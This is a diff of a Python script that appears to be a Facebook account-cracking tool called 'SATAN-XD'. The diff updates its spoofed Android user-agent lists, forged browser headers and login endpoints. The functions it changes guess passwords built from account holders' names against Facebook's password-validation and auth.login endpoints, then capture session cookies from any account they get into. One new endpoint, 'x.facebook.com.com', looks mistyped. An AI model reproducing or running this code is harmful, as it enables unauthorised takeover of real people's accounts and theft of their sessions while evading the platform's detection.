@@ -26,12 +26,12 @@ for xd in range(10000):
         i='0'
         j=random.randrange(4200,4900)
         k=random.randrange(40,150)
-        l='Mobile Safari/537.36'
+        l='Mobile Safari/537.36',"Dalvik/2.1.0 (Linux; U; Android 11; SmartTV Build/RTM4.220307.159)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TD4A.221205.042.A1)","Dalvik/2.1.0 (Linux; U; Android 12; A161 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; MAXIMUS 5.0 Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; Android 7.1.2; MI 8 SE Build/311vx; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 9; SHV46 Build/PKQ1.190626.001)","Dalvik/2.1.0 (Linux; U; Android 13; NX712J Build/TKQ1.221220.001)","Dalvik/2.1.0 (Linux; U; Android 11; T766H_EEA Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; 5002E Build/QKQ1.200623.002) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 9; ZTE Blade A3 2020 Build/PPR1.180610.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 13; SM-A145M Build/TP1A.220624.014) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 9; T5 Build/PPR1.180610.011) VD/235","Dalvik/2.1.0 (Linux; U; Android 10; M2003J15SC MIUI/V12.0.10.0.QJOEUXM) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; Studio Mini 2023 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g pure Build/S3RH32.20-42-13-2-3)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Viva_1003G_Lite Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 fusion Build/S3SJS32.1-86-2-4)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-N971N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 11; Facilotab L Rubis Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone_x86_64 Build/TE1A.220922.025)","Dalvik/2.1.0 (Linux; U; Android 13; sdk_gphone64_x86_64 Build/TSE5.230214.001)","Dalvik/2.1.0 (Linux; U; Android 11; M40Pro_RUS Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; NLG-QBEX Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; Aquaris X5 Plus Build/MMB29M)","Dalvik/2.1.0 (Linux; U; Android 11; KFRAWI Build/RS8318.2031N)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60) Build/S2RIS32.32-20-7-11)","Dalvik/2.1.0 (Linux; U; Android 12; V Max Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; SM-A505FN Build/RP1A.200720.012) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 10; S88Pro Build/QP1A.190711.020) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 10; M2004J19C MIUI/V12.0.4.0.QJCMIXM) VD/235","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 7a Build/TQ2B.230505.005.A1) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 8.1.0; PLUM Z712 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 12; moto g stylus 5G Build/S2RES32.29-16-1-5-1-5)","Dalvik/2.1.0 (Linux; U; Android 12; RMX2111 Build/SP1A.210812.016) baiduboxapp/13.33.0.11 (Baidu; P1 12) SP-engine/2.71.0 baiduboxapp/13.33.0.11 (Baidu; P1 12) dumedia/7.41.52.13","Dalvik/2.1.0 (Linux; U; Android 11; Redmi K30i 5G Build/RKQ1.200826.002)","Dalvik/2.1.0 (Linux; U; Android 12; I1927 Build/SP1A.210812.003)","Dalvik/2.1.0 (Linux; U; Android 12; Tab 12 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g42 Build/S2SE32.28-13-1)","Dalvik/2.1.0 (Linux; U; Android 12; Nokia G11 Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 13; I2203 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 6.0; V730 Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; Redmi Note 5 Pro Build/SQ3A.220705.003)","Dalvik/2.1.0 (Linux; U; Android 12; Element 5 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G11 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10.0; pop Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 13; M2012K10C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; BOOKEEN Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; M10L Pro Build/S00812)","Dalvik/2.1.0 (Linux; U; Android 11; Hisense Infinity H60 Lite Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 11; Nokia C2 2nd Edition Build/RP1A.200720.011) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 12; 2109119DI Build/SKQ1.211006.001) AppleWebKit [PB/107]","Dalvik/2.1.0 (Linux; U; Android 12; 2201117TY Build/SKQ1.211103.001) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 12; CPH2357 Build/SP1A.210812.016) AppleWebKit [PB/106]","Dalvik/2.1.0 (Linux; U; Android 11; M2010J19SY Build/RKQ1.201004.002) VD/235","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G Build/RPNS31.Q1-51-40-16-3)","Dalvik/2.1.0 (Linux; U; Android 12; moto g 5G (2022) Build/S2SA32.1-54-17)","Dalvik/2.1.0 (Linux; U; Android 13; SM-F700U Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; 6002D Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one vision plus Build/PPIS29.65-51-7)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 5 Build/TQ2A.230505.002.A1)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; Aquaris M10 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; CRT-LX2 Build/HONORCRT-L32)","Dalvik/2.1.0 (Linux; U; Android 10; 9060G Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9.0; MF-MQX02 Build/NHG47K)","Dalvik/2.1.0 (Linux; U; Android 12; X20 Build/X20)","Dalvik/2.1.0 (Linux; U; Android 13; M2103K19C Build/TP1A.220624.014)","Dalvik/1.6.0 (Linux; U; Android 4.4.4; RIDGE 4G Build/KTU84P)","Dalvik/2.1.0 (Linux; U; Android 9; ASUS_I003DD Build/PI)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A245F Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; Mediatek MT8173 Chromebook Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4a (5G) Build/TQ2A.230505.002.A1)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546W Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 10; Shanling M3 Ultra Build/QKQ1.201124.002)","Dalvik/2.1.0 (Linux; U; Android 13; moto e13 Build/TLA33.105-129)","Dalvik/2.1.0 (Linux; U; Android 12; moto g(60)s Build/S3RLS32.114-25-9)","Dalvik/2.1.0 (Linux; U; Android 12; ZTE A2023G Build/SKQ1.220213.001)","Dalvik/2.1.0 (Linux; U; Android 11; hatch Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 12; moto e32 Build/STC32.60-74)","Dalvik/2.1.0 (Linux; U; Android 13; SH-52C Build/S202H)","Dalvik/2.1.0 (Linux; U; Android 10; BQ-5533G Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 10; Bphone B86 Build/QKQ1.200329.002)","Dalvik/2.1.0 (Linux; U; Android 10; EA-94613 Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; I9_Plus_WIFI_ROW Build/SQ3A.220605.009.B1)","Dalvik/2.1.0 (Linux; U; Android 10; RAVOZ Z5 Lite Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 9; AFTALMO Build/PS7633.3445N)","Dalvik/2.1.0 (Linux; U; Android 10; X410 Build/QP1A.190711.020)","Dalvik/2.1.0 (Linux; U; Android 13; WP22 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; Mi A2 Lite Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 9; KFMUWI Build/PS7327.3326N) C4oD_Android/9.6.1 (uid:2091d5fa-c4d1-47f9-9cf1-761e4a018683; tid:-; did:Amazon_KFMUWI_28;)","Dalvik/2.1.0 (Linux; U; Android 9; KFTRWI Build/PS7328.3433N) C4oD_Android/9.6.1 (uid:12e6e155-6b52-4a7b-94c9-ff93795e5c2f; tid:-; did:Amazon_KFTRWI_28;)","Dalvik/2.1.0 (Linux; Android 7.1.2; Redmi 6 Build/173vz; wv) AppleWebKit","Dalvik/2.1.0 (Linux; U; Android 10; CDY-NX9A Build/HUAWEICDY-N09)","Dalvik/2.1.0 (Linux; U; Android 12; moto g22 Build/STAS32.79-77-28-50-4)","Dalvik/2.1.0 (Linux; U; Android 13; FNE-NX9 Build/HONORFNE-N29)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2197 Build/TP1A.220905.001; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 11; dedede Build/R113-15393.48.0)","Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHGS31.Q3-37-43-43-5-4-17)","Dalvik/2.1.0 (Linux; U; Android 10; SM-A105M Build/HUAWEIELS-N29)","Dalvik/2.1.0 (Linux; U; Android 12; RBN-NX3 Build/HONORRBN-N03)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-14)"
         uaku2=f'{aa} {b}; {c}) {g}{h}.{i}.{j}.{k} {l}'
         ugen.append(uaku2)
 for agent in range(10000):
         aa='Mozilla/5.0 (Linux; Android 6.0.1;'
-        b=random.choice(['6','7','8','9','10','11','12','13'])
+        b=random.choice(['6','7','8','9','10','11','12','13','14'])
         c='en-us; 10; T-Mobile myTouch 3G Slide Build/'
         d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
         e=random.randrange(1, 999)
@@ -57,7 +57,7 @@ db   8D 88   88    88    88   88 88  V888   R
 ----------------------------------------------
  Author    : SC UPDATE
  Github    : LUCIFER
- Version   : 0.2
+ Version   : 0.4
 ----------------------------------------------
 Your lips are like wine & amp; I wanna get drunk.
 \033[1;37m----------------------------------------------""")
@@ -459,10 +459,10 @@ def ffb(ids,names,passlist):
                 for fikr in passlist:
                         pas = fikr.replace('First',first).replace('Last',last).replace('first',ps).replace('last',ps2)
                         ua=random.choice(ugen)
-                        head = {'Host': 'm.facebook.com', 'viewport-width': '980', 'sec-ch-ua': 'Not A;Brand";v="99", "Chromium";v="100", "Google Chrome";v="100', 'sec-ch-ua-mobile': '?1', 'sec-ch-ua-platform':'"Android"', 'sec-ch-prefers-color-scheme': 'light', 'dnt': '1', 'upgrade-insecure-requests': '1', 'user-agent': stn_ua, 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'sec-fetch-site': 'none', 'sec-fetch-mode': 'navigate', 'sec-fetch-user': '?1', 'sec-fetch-dest': 'document', 'accept-encoding': 'gzip, deflate, br', 'accept-language': 'en-US,en;q=0.9'}
-                        getlog = session.get(f'https://free.facebook.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
+                        head = {'Host': 'x.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'en-US,en;q=0.9','cache-control': 'max-age=0','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="113", "Google Chrome";v="113"','sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="113.0.5642.218", "Google Chrome";v="113.0.5642.218"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '""','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent':ua,'viewport-width': '980'}
+                        getlog = session.get(f'https://x.facebook.com.com/login/device-based/password/?uid={ids}&flow=login_no_pin&refsrc=deprecated&_rdr')
                         idpass ={"lsd":re.search('name="lsd" value="(.*?)"', str(getlog.text)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(getlog.text)).group(1),"uid":ids,"next":"https://m.facebook.com/login/save-device/","flow":"login_no_pin","pass":pas,}
-                        complete = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
+                        complete = session.post('https://x.facebook.com.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
                         SATAN=session.cookies.get_dict().keys()
                         if "c_user" in SATAN:
                                 coki=session.cookies.get_dict()
@@ -487,7 +487,7 @@ def ffb(ids,names,passlist):
 xxxxx=("GT-1015","GT-1020","GT-1030","GT-1035","GT-1040","GT-1045","GT-1050","GT-1240","GT-1440","GT-1450","GT-18190","GT-18262","GT-19060I","GT-19082","GT-19083","GT-19105","GT-19152","GT-19192","GT-19300","GT-19505","GT-2000","GT-20000","GT-200s","GT-3000","GT-414XOP","GT-6918","GT-7010","GT-7020","GT-7030","GT-7040","GT-7050","GT-7100","GT-7105","GT-7110","GT-7205","GT-7210","GT-7240R","GT-7245","GT-7303","GT-7310","GT-7320","GT-7325","GT-7326","GT-7340","GT-7405","GT-7550 5GT-8005","GT-8010","GT-81","GT-810","GT-8105","GT-8110","GT-8220S","GT-8410","GT-9300","GT-9320","GT-93G","GT-A7100","GT-A9500","GT-ANDROID","GT-B2710","GT-B5330","GT-B5330B","GT-B5330L","GT-B5330ZKAINU","GT-B5510","GT-B5512","GT-B5722","GT-B7510","GT-B7722","GT-B7810","GT-B9150","GT-B9388","GT-C3010","GT-C3262","GT-C3310R","GT-C3312","GT-C3312R","GT-C3313T","GT-C3322","GT-C3322i","GT-C3520","GT-C3520I","GT-C3592","GT-C3595","GT-C3782","GT-C6712","GT-E1282T","GT-E1500","GT-E2200","GT-E2202","GT-E2250","GT-E2252","GT-E2600","GT-E2652W","GT-E3210","GT-E3309","GT-E3309I","GT-E3309T","GT-G530H","GT-G930F","GT-H9500","GT-I5508","GT-I5801","GT-I6410","GT-I8150","GT-I8160OKLTPA","GT-I8160ZWLTTT","GT-I8258","GT-I8262D","GT-I8268""GT-I8505","GT-I8530BAABTU","GT-I8530BALCHO","GT-I8530BALTTT","GT-I8550E","GT-I8750","GT-I900","GT-I9008L","GT-I9080E","GT-I9082C","GT-I9082EWAINU","GT-I9082i","GT-I9100G","GT-I9100LKLCHT","GT-I9100M","GT-I9100P","GT-I9100T","GT-I9105UANDBT","GT-I9128E","GT-I9128I","GT-I9128V","GT-I9158P","GT-I9158V","GT-I9168I","GT-I9190","GT-I9192","GT-I9192I","GT-I9195H","GT-I9195L","GT-I9250","GT-I9300","GT-I9300I","GT-I9301I","GT-I9303I","GT-I9305N","GT-I9308I","GT-I9500","GT-I9505G","GT-I9505X","GT-I9507V","GT-I9600","GT-M5650","GT-N5000S","GT-N5100","GT-N5105","GT-N5110","GT-N5120","GT-N7000B","GT-N7005","GT-N7100","GT-N7100T","GT-N7102","GT-N7105","GT-N7105T","GT-N7108","GT-N7108D","GT-N8000","GT-N8005","GT-N8010","GT-N8020","GT-N9000","GT-N9505","GT-P1000CWAXSA","GT-P1000M","GT-P1000T","GT-P1010","GT-P3100B","GT-P3105","GT-P3108","GT-P3110","GT-P5100","GT-P5110","GT-P5200","GT-P5210","GT-P5210XD1","GT-P5220","GT-P6200","GT-P6200L","GT-P6201","GT-P6210","GT-P6211","GT-P6800","GT-P7100","GT-P7300","GT-P7300B","GT-P7310","GT-P7320","GT-P7500D","GT-P7500M","SAMSUNG","LMY4","LMY47V","MMB29K","MMB29M","LRX22C","LRX22G","NMF2","NMF26X","NMF26X;","NRD90M","NRD90M;","SPH-L720","IML74K","IMM76D","JDQ39","JSS15J","JZO54K","KOT4","KOT49H","KOT4SM-T310","KTU84P","SM-A500F","SM-A500FU","SM-A500H","SM-G532F","SM-G900F","SM-G920F","SM-G930F","SM-G935","SM-G950F","SM-J320F","SM-J320FN","SM-J320H","SM-J320M","SM-J510FN","SM-J701F","SM-N920S","SM-T111","SM-T230","SM-T231","SM-T235","SM-T280","SM-T311","SM-T315","SM-T525","SM-T531","SM-T535","SM-T555","SM-T561","SM-T705","SM-T805","SM-T820")
 def api(ids,names,passlist):
                 try:
-                        global ok,loop
+                        global oks,loop,cps
                         sys.stdout.write('\r\r\033[1;37m [SATAN-XD] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
                         fn = names.split(' ')[0]
                         try:
@@ -516,35 +516,31 @@ def api(ids,names,passlist):
                                         'generate_session_cookies':'1',
                                         'generate_analytics_claim':'1',
                                         'generate_machine_id':'1',
-                                        "locale":"en_US","client_country_code":"US",
+                                        "locale":"es_CU","client_country_code":"CU",
                                         'device':gtt,
                                         'device_id':adid,
                                         "method": "auth.login",
                                         "fb_api_req_friendly_name": "authenticate",
-                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler"}
+                                        "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",}
                                 head = {
     "method": 'GET', 
     "path": '/',
     "scheme": 'https', 
-    'authority': 'm.facebook.com',
+    'authority': 'free.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'sec-ch-prefers-color-scheme': 'light',
-    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="80", "Google Chrome";v="80"',
-    'sec-ch-ua-full-version-list': '"(Not(A:Brand";v="99.0.0.0", "Chromium";v="80.0.3987.119", "Google Chrome";v="80.0.3987.119"',
+    'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="20"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
-    'sec-ch-ua-platform-version': '""',
     'sec-fetch-dest': 'document',
     'sec-fetch-mode': 'navigate',
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': 'Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/80.0.3987.119 Mobile Safari/537.36',
-    'viewport-width': '980',
+    'user-agent': stn_ua,
 }
-                                url = 'https://m.facebook.com/method/auth.login'
+                                url = 'https://b-graph.facebook.com//method/auth.login'
                                 po = requests.post(url,data=data,headers=head,allow_redirects=False).text
                                 q = json.loads(po)
                                 if 'session_key' in q:
